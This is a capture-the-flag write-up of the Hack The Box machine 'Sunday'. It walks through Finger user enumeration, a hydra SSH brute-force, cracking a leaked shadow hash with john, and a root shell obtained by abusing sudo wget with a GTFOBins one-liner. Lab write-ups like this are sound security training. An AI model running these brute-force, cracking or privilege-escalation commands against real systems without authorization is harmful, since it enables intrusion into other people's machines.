---
title: "Sunday"
difficulty: Easy
os: Solaris
points: 20
rating: 4.3
date: 2018-04-28
avatar: assets/htb/sunday.png
tags: [Weak Credentials, Misconfiguration, Reconnaissance, User Enumeration, Password Cracking, Brute Force Attack, SUDO Exploitation, SSH]
htb_url: https://app.hackthebox.com/machines/Sunday
---
**About**
### Machine Description

Sunday is a relatively straightforward box, though it runs rather dated software and can behave inconsistently now and then. Its core themes are abusing the Finger service and leveraging weak credentials.

### Area of Interest

Enterprise Network Protocols Vulnerability Assessment Authentication

### Technology

SSH Finger

### Vulnerabilities

Weak Credentials Misconfiguration

### Security Tools

Nmap Zenmap John finger-user-enum

### Techniques

Reconnaissance User Enumeration Password Cracking Brute Force Attack SUDO Exploitation

## Summary

Sunday is an easy Solaris box that revolves around the legacy Finger service and weak credentials. I enumerate valid system users through the Finger daemon on port 79, brute-force SSH to land as `sunny`, recover `sammy`'s password from a leaked `/backup/shadow.backup`, and finally escalate to root by abusing `sudo /usr/bin/wget` via GTFOBins.

## Enumeration

Before scanning I set up a working directory and add the target to my hosts file. The target IP is `<YOUR_IP>`.

```bash
su
echo "<YOUR_IP> sunday.htb" >> /etc/hosts

mkdir -p htb/sunday.htb
cd htb/sunday.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I like to kick off recon by pinging the host, which both confirms it's reachable and hints at the underlying OS.

```bash
ping -c 3 sunday.htb
PING sunday.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from sunday.htb (<YOUR_IP>): icmp_seq=1 ttl=254 time=53.7 ms
64 bytes from sunday.htb (<YOUR_IP>): icmp_seq=2 ttl=254 time=50.8 ms
64 bytes from sunday.htb (<YOUR_IP>): icmp_seq=3 ttl=254 time=54.7 ms
```

Across these three ICMP replies the Time To Live (TTL) is neither 64 nor 128. That's somewhat unusual, and a quick search reveals the target is running a **Solaris OS** system.

### Port scanning

I jump straight into an active port scan with nmap.

```bash
sudo nmap -p0- -sS -Pn -T4 -vvv sunday.htb -oN nmap/tcp_port_scan
```

```bash
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  unknown
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>

So the box exposes 5 open TCP ports: 79, 111, 515, 6787, 22022. The Finger service lives on the standard TCP port **79**. Next, I enumerate the services running behind those open ports.

```bash
sudo nmap -sV -sC -p 79,111,515,6787,22022 sunday.htb -oN nmap/service_port_scan
```

```bash
PORT      STATE SERVICE VERSION
79/tcp    open  finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.94SVN%I=7%D=11/24%Time=6743B8CD%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login
SF:\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x2
SF:0\x20\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nH
SF:ELP\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Nam
SF:e\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Wh
SF:ere\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20
SF:\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x2
SF:0\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\
SF:.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%
SF:r(SSLSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\
SF:x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20
SF:\x20\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");

```

The Finger protocol is confirmed, and two other noteworthy services show up too: a web server on port 6787 and OpenSSH on port 22022.

### Web service on 6787

Visiting [`https://sunday.htb:6787/`](https://sunday.htb:6787/solaris/login/) presents a Solaris login page. Sadly the login bypass fails, and whatweb doesn't turn up much either.

```bash
whatweb sunday.htb:6787
http://sunday.htb:6787 [400 Bad Request] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[<YOUR_IP>], Title[400 Bad Request], X-Frame-Options[SAMEORIGIN]
```

### Finger user enumeration

The **Finger** program/service is used to look up information about users on a machine. The data returned usually covers the **user's login name, full name**, and occasionally more. Those extras might include the office location and phone number (when set), the login time, how long the session has been idle, when the user last read mail, and the contents of the user's plan and project files.

The best way to learn something is to push yourself and build your own tooling, so that's what I did, writing the following python tool that enumerates the system's users with a dictionary attack against a common wordlist.

```bash
python3 finger_user_enumeration.py -t sunday.htb -w users.txt
```

Setting root aside, two users come back who show a `pts`: **sammy** and **sunny**.

## Foothold

### Brute-forcing sunny over SSH

A brute-force tool such as Hydra can help us recover sunny's password. I take a shot at it over the SSH service on port 22022.

```
hydra -l sunny -P /home/kali/Downloads/probable-v2-top1575.txt -I -f ssh://sunday.htb:22022
```

There's the password, which frankly we might even have guessed: **sunday**.

### Recovering sammy's password

Hydra comes up empty against sammy, so instead I log in over SSH as the sunny user.

```bash
ssh sunny@sunday.htb -p 22022
```

Here I find the home folders of both users, but nothing useful regarding the password. sammy's folder holds a bash history, so I check whether any passwords were accidentally typed out in clear text.

```bash
cat ~/.bash_history | grep "password"
```

No results. Luckily, poking around a little I discover the file `shadow.backup` under `/backup`, which holds a copy of `/etc/shadow` and hence the users' hashes. I extract sammy's hash and run john against it.

```bash
echo "sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::" >> sammy_hash
```

```bash
john sammy_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

John cracks it, yielding the password **cooldude!**.

### User flag

With sammy's password now in hand, I SSH in and grab the flag without trouble.

```bash
ssh sammy@sunday.htb -p 22022
```

```bash
cat user.txt
db77************************f834
```

## Privilege Escalation

I check the sudo rights for each foothold user with `sudo -l`. As `sunny`, the only entry is `/root/troll`; as `sammy`, the entry is `/usr/bin/wget`.

Since "troll" is unfamiliar, and I suspect it's a tongue-in-cheek name, I turn my attention to the familiar `wget` available to sammy. As usual, the GTFOBins wget reference offers a route to privilege escalation via sudo.

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```

This drops a root shell, and I read the final flag.

```
cat /root/root.txt
c4fc************************aea7
```

---
